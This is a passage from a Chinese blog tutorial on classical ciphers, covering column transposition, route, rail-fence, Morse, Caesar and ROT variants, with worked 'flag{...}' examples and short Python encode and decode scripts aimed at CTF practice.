title="列置换密码"></a>列置换密码</h3><p>将明文p以设定的固定分组宽度m按行写出，即每行有m个字符；若明文长度不是m的整数倍，则不足部分用双方约定的方式填充（如双方约定用空格代替空缺处字符），最后得字符矩阵[Mp]n×m，按1，2…，m的某一置换σ交换列的位置次序得字符矩阵[Mp]n×m，把矩阵按[Mp]n×m列的顺序依次读出得密文序列c。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">明文：P=flag&#123;012345&#125;</span><br><span class="line">分组宽为m=4,得3行4列矩阵M:</span><br><span class="line">M= [f   l   a   g</span><br><span class="line">&#123;012</span><br><span class="line">345&#125;]</span><br><span class="line">置换σ=(1 3)(24)#也就是将第1列跟第3列做位置交换，第2列跟第4列做位置交换</span><br><span class="line">M&#x27;=[a   g   f   1</span><br><span class="line">12&#123;0</span><br><span class="line">5&#125;34]</span><br><span class="line">得到密文信息a15g2&#125;f&#123;3104</span><br></pre></td></tr></table></figure><p>将密文c以分组宽度n按列写出得到字符矩阵[Mp]n×m，按加密过程用的置换σ的逆置换σ-1交换列的位置次序得字符矩阵[Mp]n×m，把矩阵[Mp]n×m按1，2…，n行的顺序依次读出得明文p</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">先把密文信息a15g2&#125;f&#123;3104转换成3行4列矩阵M(置换规则是4个数字)</span><br><span class="line">M&#x27;=[a   g   f   1</span><br><span class="line">12&#123;0</span><br><span class="line">5&#125;34]</span><br><span class="line">加密的置换算法逆置换σ=(3 1)(4 2)#也就是将第3列跟第1列做位置交换，第4列跟第2列做位置交换</span><br><span class="line">M= [f   l   a   g</span><br><span class="line">&#123;012</span><br><span class="line">345&#125;]</span><br><span class="line">得到最后的原文flag&#123;012345&#125;</span><br></pre></td></tr></table></figure><ul><li>列置换的另一种说法</li></ul><p>首先能够把明文去掉空格后，分成分成n×m的一个矩阵如果有空格可以使用约定的字符进行加密，然后根据密钥的顺序依次读取数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">明文：P=flag&#123;012345&#125;</span><br><span class="line">分组宽为m=4,得3行4列矩阵M:</span><br><span class="line">置换规则σ=(3142)#有的给定一个单词用单词在字母表中的顺序确定置换规则cadb</span><br><span class="line">3142#对应到矩阵列上面</span><br><span class="line">M= [f   l   a   g</span><br><span class="line">&#123;012</span><br><span class="line">345&#125;]</span><br><span class="line">根据置换规则的序号依次拼接完整信息得到完整的密文信息</span><br><span class="line">得到密文信息l04g2&#125;f&#123;3a15</span><br></pre></td></tr></table></figure><p>解密过程就是根据原来的置换规则的逆规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">现有密文信息l04g2&#125;f&#123;3a15</span><br><span class="line">置换规则是4个数字所以生成一个4列*3行的矩阵</span><br><span class="line">置换规则σ=(3142)的逆向规则σ&#x27;=(2413)</span><br><span class="line">先分组l04+g2&#125;+f&#123;3+a15，生成矩阵</span><br><span class="line">2413#对应到矩阵列上面</span><br><span class="line">M= [l   g   f   a</span><br><span class="line">02&#123;1</span><br><span class="line">4&#125;35]</span><br><span class="line">根据置换规则的序号依次拼接完整信息得到完整的密文信息</span><br><span class="line">得到密文信息flag&#123;012345&#125;</span><br></pre></td></tr></table></figure><p>hint：列置换密码算法需要知道密钥的长度和顺序</p><h3 id="曲路密码"><a href="#曲路密码" class="headerlink" title="曲路密码"></a>曲路密码</h3><p>将明文p以设定的固定分组宽度m按行写出，即每行有m个字符；若明文长度不是m的整数倍，则不足部分用双方约定的方式填充（如双方约定用空格代替空缺处字符），最后得字符矩阵[Mp]n×m，按照一定顺序从头到位遍历所有的字符，把读取到的字符拼接得到密文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">加密的文本flag&#123;012345&#125;,长度为12</span><br><span class="line">可以使用2*6、3*4的矩阵填入全部的字符，这边选3*4也就是3行×4列</span><br><span class="line">首先将加密的文本按行填入该矩阵,如下面所示</span><br><span class="line">f   l   a   g</span><br><span class="line">    &#123;012</span><br><span class="line">345&#125;</span><br><span class="line">此时按照约定的顺序遍历所有的字符</span><br><span class="line">&lt;-------&lt;-------</span><br><span class="line">f|l   ^a|g^</span><br><span class="line">    &#123;|0|1|2|</span><br><span class="line">3↓4|5↓&#125;|</span><br><span class="line">(结束)   &lt;------- (开始)</span><br><span class="line">按照次顺序以此取出矩阵中的元素即得到密文信息：&#125;2ga1540lf&#123;3</span><br></pre></td></tr></table></figure><p>给定加密密码和矩阵规格，也容易得到原文，需要事先双方约定密钥（即曲路路径）</p><p>只需要按照同样的顺序首先把加密码填入矩阵，然后按照行顺序取出组合在一起</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">现有密文：&#125;2ga1540lf&#123;3，长度为12</span><br><span class="line">原文密码的矩阵是3*4也就是3行×4列</span><br><span class="line">所以第一个字符就是最左下角，逆向读取每个字符得到原文</span><br><span class="line">&lt;--------&lt;--------</span><br><span class="line">*|*   ^*|*↑</span><br><span class="line">    &#123;|*|*|2|</span><br><span class="line">3↓*|*↓&#125;|</span><br><span class="line">(开始)   &lt;------- (开始)</span><br><span class="line">也可以画一个表格然后每个字符填入即可得到原文：flag&#123;012345&#125;</span><br></pre></td></tr></table></figure><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p>栅栏密码（Rail-fence Cipher）就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N个字符组合，最后一个分组需要满足N个不满足的话就用一个填充符号，最后把他们全部连接起来就是密文（分成几组要求是根据明文长度来，因数关系）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">明文：P=flag&#123;012345&#125;，明文长度是12可以分成2，3，4，6个一组</span><br><span class="line">加密的密钥：N=2，3，4，6</span><br><span class="line">按照每6个字符组成一组，分成两组，</span><br><span class="line">现在分组情况是第一组flag&#123;0、第二组12345&#125;</span><br><span class="line">分别取每组的第一个字符组成密文1，再取每组第二个字连起来得到密文2...</span><br><span class="line">然后全部密文拼接得到后来的密文</span><br><span class="line">flag&#123;0+12345&#125;</span><br><span class="line">第一组f1、第二组l2、第三组a3、第四组g4、第五组&#123;5、第六组0&#125;</span><br><span class="line">f1l2a3g4&#123;50&#125;</span><br><span class="line">所以得到的最终密文f1l2a3g4&#123;50&#125;，称为6栏加密</span><br></pre></td></tr></table></figure><p>python脚本实现栅栏密码加密过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N=栏数</span><br><span class="line">crypto=明文</span><br><span class="line">for i in range(0,N):</span><br><span class="line">    for n in range(i,len(crypto),N):</span><br><span class="line">        print(crypto[n],end=&#x27;&#x27;)</span><br><span class="line">#外层循环用于分组，内循环用步长取值，判断一下取值就大概了解原理了</span><br></pre></td></tr></table></figure><ul><li>明文或密文中如果出现连续空格将原样保留。</li><li>在进行多行文本\段落加密时，每行独立进行加密。</li><li>N的取值范围在2到明文长度-1之间。</li></ul><p>python脚本实现栅栏密码解密过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zhalan=&#x27;f1l2a3g4&#123;50&#125;&#x27;</span><br><span class="line">for i in range(0,2):</span><br><span class="line">    for n in range(i,len(zhalan),2):</span><br><span class="line">        flag=flag+zhalan[n]</span><br><span class="line">        print(zhalan[n], end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>hint：现有明文长度是a=b*c，当明文经过b栏加密后，将密文再次通过c栏加密可以恢复明文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 栅栏加解密合并</span><br><span class="line">def railfence(content):</span><br><span class="line">    all=[]</span><br><span class="line">    for key in range(2,len(content)):</span><br><span class="line">        flag=&#x27;&#x27;</span><br><span class="line">        if len(content)%key==0:</span><br><span class="line">            for i in range(0, key):</span><br><span class="line">                for n in range(i, len(content), key):</span><br><span class="line">                    flag=flag+content[n]</span><br><span class="line">                    # print(content[n], end=&#x27;&#x27;)</span><br><span class="line">            all.append(&#x27;栏数为:&#123;0&#125;时,结果为:&#123;1&#125;&#x27;.format(key,flag))</span><br><span class="line">    print(all)</span><br><span class="line">    print(len(all))</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    content=&#x27;flag&#123;012345&#125;&#x27;</span><br><span class="line">    railfence(content)</span><br><span class="line">    content=&#x27;f&#123;3l04a15g2&#125;&#x27;</span><br><span class="line">    railfence(content)</span><br></pre></td></tr></table></figure><h2 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h2><p>又称为替换密码就是将明文中的每个字母由其它字母、数字或符号替代的一种方法。代换密码通常要建立一个替换表，加密时将需要加密的明文依次通过查表，替换为相应的字符，明文字符被逐个替换后，生成无任何意义的字符串，即密文，这些替换表就作为密钥。代换密码中，则可以认为是保持明文的符号顺序，但是将他们用其他符号来替代。</p><ul><li>单表替换密码</li></ul><p>又称为单字母替换，明文字母表中的一个字符对应密文字母表中的一个字符。即对明文消息中出现的同一个字母，在加密时都使用同一固定的字母来代换。</p><ul><li>多表替换密码</li></ul><p>指两个以上替换表依次对明文消息的字母进行替换。明文消息中出现的同一个字母，在加密时不是完全被同一固定的字母代换，而是根据其出现的位置次序，用不同的字母代换。例如，使用有5个替换表的替换密码，明文的第一个字母对应第一个替换表，第二个字母对应第二个替换表,以此类推。</p><h3 id="单表替换密码"><a href="#单表替换密码" class="headerlink" title="单表替换密码"></a>单表替换密码</h3><p>在单表替换加密中，所有的加密方式几乎都有一个共性，那就是明密文一一对应。所以说，一般有以下两种方式来进行破解</p><ul><li>在密钥空间较小的情况下，采用暴力破解方式</li><li>在密文长度足够长的时候，使用词频分析</li></ul><p>当密钥空间足够大，而密文长度足够短的情况下，破解较为困难。</p><h4 id="摩斯电码"><a href="#摩斯电码" class="headerlink" title="摩斯电码"></a>摩斯电码</h4><p>摩尔斯电码（又译为摩斯电码，Morse code）是一种时通时断的信号代码，这种信号代码通过不同的排列顺序来表达不同的英文字母、数字和标点符号等。它发明于1837年，发明者有争议，是美国人塞缪尔·莫尔斯或者艾尔菲德·维尔。 </p><p>摩尔斯电码的符号由两种基本信号和不同的间隔时间组成：短促的点信号“ .”，保持一定时间的长信号“-”。</p><p><img src="/image/media/2022/crypto/1.png"></p><p>可以借助在线工具对信息做加解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br><span class="line">加密得到</span><br><span class="line">···· · ·－·· ·－·· －－－   ·－－ －－－ ·－· ·－·· －·· </span><br><span class="line">解密得到</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>python实现莫斯解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#莫斯密码加解密</span><br><span class="line">def mosdecrypt(content):</span><br><span class="line">    MorseList = &#123;&#x27;A&#x27;: &quot;.-&quot;, &#x27;B&#x27;: &quot;-...&quot;, &#x27;C&#x27;: &quot;-.-.&quot;, &#x27;D&#x27;: &quot;-..&quot;, &#x27;E&#x27;: &quot;.&quot;, &#x27;F&#x27;: &quot;..-.&quot;, &#x27;G&#x27;: &quot;--.&quot;,</span><br><span class="line">                 &#x27;H&#x27;: &quot;....&quot;, &#x27;I&#x27;: &quot;..&quot;, &#x27;J&#x27;: &quot;.---&quot;, &#x27;K&#x27;: &quot;-.-&quot;, &#x27;L&#x27;: &quot;.-..&quot;, &#x27;M&#x27;: &quot;--&quot;, &#x27;N&#x27;: &quot;-.&quot;,</span><br><span class="line">                 &#x27;O&#x27;: &quot;---&quot;, &#x27;P&#x27;: &quot;.--.&quot;, &#x27;Q&#x27;: &quot;--.-&quot;, &#x27;R&#x27;: &quot;.-.&quot;, &#x27;S&#x27;: &quot;...&quot;, &#x27;T&#x27;: &quot;-&quot;, &#x27;U&#x27;: &quot;..-&quot;,</span><br><span class="line">                 &#x27;V&#x27;: &quot;...-&quot;, &#x27;W&#x27;: &quot;.--&quot;, &#x27;X&#x27;: &quot;-..-&quot;, &#x27;Y&#x27;: &quot;-.--&quot;, &#x27;Z&#x27;: &quot;--..&quot;,</span><br><span class="line">                 &#x27;1&#x27;: &quot;.----&quot;, &#x27;2&#x27;: &quot;..---&quot;, &#x27;3&#x27;: &quot;...--&quot;, &#x27;4&#x27;: &quot;....-&quot;, &#x27;5&#x27;: &quot;.....&quot;,</span><br><span class="line">                 &#x27;6&#x27;: &quot;-....&quot;, &#x27;7&#x27;: &quot;--...&quot;, &#x27;8&#x27;: &quot;---..&quot;, &#x27;9&#x27;: &quot;----.&quot;, &#x27;0&#x27;: &quot;-----&quot;,</span><br><span class="line">                 &#x27;.&#x27;: &quot;.-.-.-&quot;, &#x27;?&#x27;: &quot;..--..&quot;, &#x27;!&#x27;: &quot;-.-.--&quot;, &#x27;(&#x27;: &quot;-.--.&quot;, &#x27;@&#x27;: &quot;.--.-.&quot;, &#x27;:&#x27;: &quot;---...&quot;,</span><br><span class="line">                 &#x27;=&#x27;: &quot;-...-&quot;, &#x27;-&#x27;: &quot;-....-&quot;, &#x27;)&#x27;: &quot;-.--.-&quot;, &#x27;,&#x27;: &quot;--..--&quot;, &#x27;\&#x27;&#x27;: &quot;.----.&quot;, &#x27;_&#x27;: &quot;..--.-&quot;,</span><br><span class="line">                 &#x27;$&#x27;: &quot;...-..-&quot;, &#x27;;&#x27;: &quot;-.-.-.&quot;, &#x27;/&#x27;: &quot;-..-.&quot;, &#x27;\&quot;&#x27;: &quot;.-..-.&quot;, &#x27;&amp;&#x27;: &quot;.-...&quot;,</span><br><span class="line">                 &#x27;+&#x27;: &quot;.-.-.&quot;,</span><br><span class="line">                 &#x27;à&#x27;: &quot;.--.-&quot;, &#x27;ä&#x27;: &quot;.-.-&quot;, &#x27;ch&#x27;: &quot;----&quot;, &#x27;ç&#x27;: &quot;-.-..&quot;, &#x27;ð&#x27;: &quot;..--.&quot;,</span><br><span class="line">                 &#x27;é&#x27;: &quot;..-..&quot;, &#x27;è&#x27;: &quot;.-..-&quot;, &#x27;ĝ&#x27;: &quot;--.-.&quot;, &#x27;ĥ&#x27;: &quot;-.--.&quot;, &#x27;ĵ&#x27;: &quot;.---.&quot;,</span><br><span class="line">                 &#x27;ñ&#x27;: &quot;--.--&quot;, &#x27;ø&#x27;: &quot;---.&quot;, &#x27;ŝ&#x27;: &quot;...-.&quot;, &#x27;þ&#x27;: &quot;.--..&quot;, &#x27;ü&#x27;: &quot;..--&quot;,&#125;</span><br><span class="line">    if &#x27;0&#x27; in content and &#x27;1&#x27; in content:</span><br><span class="line">        trans = &#x27;&#x27;.maketrans(&#x27;01&#x27;, &#x27;.-&#x27;)</span><br><span class="line">        content = content.translate(trans)</span><br><span class="line">    if &#x27;－&#x27; in content or &#x27;·&#x27; in content:</span><br><span class="line">        content=content.replace(&#x27;－&#x27;,&#x27;-&#x27;)</span><br><span class="line">        content=content.replace(&#x27;·&#x27;,&#x27;.&#x27;)</span><br><span class="line">    if &#x27;/&#x27; in content:</span><br><span class="line">        lmorsecodeList = content.split(&quot;/&quot;)</span><br><span class="line">    else:</span><br><span class="line">        content = content.replace(&#x27; &#x27;, &#x27;/&#x27;)</span><br><span class="line">        if &#x27;///&#x27; in  content:</span><br><span class="line">            content = content.replace(&#x27;///&#x27;, &#x27;/ /&#x27;)</span><br><span class="line">        lmorsecodeList = content.split(&quot;/&quot;)</span><br><span class="line">    print(lmorsecodeList)</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for char in lmorsecodeList:</span><br><span class="line">        if char ==&#x27; &#x27;:</span><br><span class="line">            flag = flag +  char</span><br><span class="line">        for k, v in MorseList.items():</span><br><span class="line">            if v == char:</span><br><span class="line">                flag = flag + k</span><br><span class="line">    print(&quot;莫斯密码小写:&quot;, flag)</span><br><span class="line">    print(&quot;莫斯密码大写:&quot;, flag.lower())</span><br><span class="line">    return flag</span><br><span class="line">content=&#x27;··   ·－·· －－－ ···－ ·   －·－－ －－－ ··－ &#x27;</span><br><span class="line">print(mosdecrypt(content))</span><br><span class="line">#莫斯密码目前感觉最全的：https://mosimima.wncx.cn/脚本中只对01做了转换</span><br></pre></td></tr></table></figure><p>hint：摩斯电码默认采用空格分隔，现在许多摩斯电码采用单斜杠/进行分隔</p><p>部分摩斯电码在线网站存在无法解密特殊字符的现象，需要仔细辨别（若干次被坑）</p><p>还有一种变体摩斯电码给的里面的信息只有两种字符组成并且能够跟摩斯电码高度相似，比如滴答之类的</p><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><p>在密码学中，凯撒密码（英语：Caesar cipher），或称凯撒加密、凯撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期凯撒的名字命名的，当年凯撒曾用此方法与其将军们进行联系。</p><ul><li>加密原理</li></ul><p>明文信息X=20，密文信息Y=0，密钥K=3</p><p>加密公式：(X+K) mod 26        (python取模符号是%)        (20+3)%26=23</p><p>解密公式：(Y-K) mod  26        (python取模符号是%)        (0-3)%26=(-3+26)%26=23</p><p>hint：28%26=2（模的结果不会比26还大，此时的结果能够在0到25之间）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">content=&#x27;WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ&#x27;</span><br><span class="line">n=3</span><br><span class="line">#-97或者-65是为了保证值在0到25之间</span><br><span class="line">print(&#x27;&#x27;.join([chr(65+(ord(i)+n-65)%26) for i in  content]))#推导式的形式</span><br><span class="line">#ZNKWWAOIQWHXUCTWLUDWPASVYWUBKXWZNKWRGFEWJUM</span><br><span class="line">print(&#x27;&#x27;.join([chr(97+(ord(i)+n-97)%26) for i in  content]))</span><br><span class="line">#theqquickqbrownqfoxqjumpsqoverqtheqlazyqdog</span><br><span class="line">mi=&#x27;&#x27;</span><br><span class="line">for i in content:</span><br><span class="line">    print(ord(i) + n - 97, i)</span><br><span class="line">    mi = mi + chr(97 + (ord(i) + n - 97) % 26)  # -97是为了保证值在0到25之间</span><br><span class="line">print(mi)</span><br><span class="line">#theqquickqbrownqfoxqjumpsqoverqtheqlazyqdog</span><br></pre></td></tr></table></figure><ul><li>注意事项</li></ul><p>（1）需要区分字母的大小写</p><p>（2）如果不是大小写字母，那么就原样输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#凯撒密码</span><br><span class="line">def caesar_Crypto(content):</span><br><span class="line">    all_plain=[]</span><br><span class="line">    for num in range(1,26):</span><br><span class="line">        plain = &#x27;&#x27;</span><br><span class="line">        for i in content:</span><br><span class="line">            if i.islower():#小写字母</span><br><span class="line">                plain = plain + chr(97 + (ord(i) + num - 97) % 26)</span><br><span class="line">            elif i.isupper():#大写字母</span><br><span class="line">                plain = plain + chr(65 + (ord(i) + num - 65) % 26)</span><br><span class="line">            else:#上面两者都不是</span><br><span class="line">                plain=plain+i</span><br><span class="line">        print(plain)</span><br><span class="line">        all_plain.append(plain)</span><br><span class="line">    print(all_plain)</span><br><span class="line">content=&#x27;IODJ&#123;Khuh_lv_brxu_iodj&#125;&#x27;</span><br><span class="line">caesar_Crypto(content)</span><br></pre></td></tr></table></figure><p>还有一种新的思路：</p><p><img src="/image/media/2022/crypto/2.png"></p><p>可以看到凯撒的原文跟密文是一对一的，所以可以灵活利用替换的思想。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># # 凯撒密码</span><br><span class="line">def caesar_Crypto(content):</span><br><span class="line">    all_plain=[]</span><br><span class="line">    lowercase = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    uppercase = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">    for num in range(1,26):</span><br><span class="line">        lower=lowercase[num:]+lowercase[:num]</span><br><span class="line">        upper=uppercase[num:]+uppercase[:num]</span><br><span class="line">        plain=&#x27;&#x27;</span><br><span class="line">        table=&#x27;&#x27;.maketrans(lower+upper,lowercase+uppercase)</span><br><span class="line">        for i in content:</span><br><span class="line">            plain=plain+i.translate(table)</span><br><span class="line">        all_plain.append(plain)</span><br><span class="line">        print(plain)</span><br><span class="line">    print(all_plain)</span><br><span class="line">content=&#x27;IODJ&#123;Khuh_lv_brxu_iodj&#125;&#x27;</span><br><span class="line">caesar_Crypto(content)</span><br></pre></td></tr></table></figure><ul><li>变异凯撒</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">格式：flag&#123; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(ord(str[0]),ord(&#x27;f&#x27;),ord(&#x27;f&#x27;)-ord(str[0]))97 102 5</span><br><span class="line">print(ord(str[1]),ord(&#x27;l&#x27;),ord(&#x27;l&#x27;)-ord(str[1]))102 108 6</span><br><span class="line">print(ord(str[2]),ord(&#x27;a&#x27;),ord(&#x27;a&#x27;)-ord(str[2]))90 97 7</span><br><span class="line">print(ord(str[3]),ord(&#x27;g&#x27;),ord(&#x27;g&#x27;)-ord(str[3]))95 103 8</span><br></pre></td></tr></table></figure><p>通过acsii码值对比表可以看到第一个字符向后移了5，第二个向后移了6，第三个向后移了7，以此类推</p><p>变异凯撒即每个向后移的位数是前一个加1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str=&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span><br><span class="line">num=5</span><br><span class="line">for i in str:</span><br><span class="line">    print(chr(ord(i)+num),end=&#x27;&#x27;)</span><br><span class="line">    num=num+1</span><br><span class="line">#flag&#123;Caesar_variation&#125;</span><br></pre></td></tr></table></figure><h4 id="rot族解密"><a href="#rot族解密" class="headerlink" title="rot族解密"></a>rot族解密</h4><p>编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。</p><h5 id="rot5"><a href="#rot5" class="headerlink" title="rot5"></a>rot5</h5><p>只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0123456789</span><br><span class="line">5678901234</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#ROT5</span><br><span class="line">def caesar_Crypto(content):</span><br><span class="line">    all_plain=[]</span><br><span class="line">    lowercase = &#x27;0123456789&#x27; #此处需要修改</span><br><span class="line">    lower=lowercase[5:]+lowercase[:5]#此处需要修改</span><br><span class="line">    plain=&#x27;&#x27;</span><br><span class="line">    table=&#x27;&#x27;.maketrans(lower,lowercase)</span><br><span class="line">    for i in content:</span><br><span class="line">        plain=plain+i.translate(table)</span><br><span class="line">    all_plain.append(plain)</span><br><span class="line">    print(plain)</span><br><span class="line">content=&#x27;flag&#123;5678901&#125;&#x27;</span><br><span class="line">caesar_Crypto(content)</span><br><span class="line">#flag&#123;0123456&#125;</span><br></pre></td></tr></table></figure><h5 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h5><p>只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz明码表</span><br><span class="line">nopqrstuvwxyzabcdefghijklm密码表</span><br><span class="line">或者</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ明码表</span><br><span class="line">NOPQRSTUVWXYZABCDEFGHIJKLM密码表</span><br></pre></td></tr></table></figure><p>hint：rot13就是位移量为13的凯撒密码</p><h5 id="rot18"><a href="#rot18" class="headerlink" title="rot18"></a>rot18</h5><p>这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 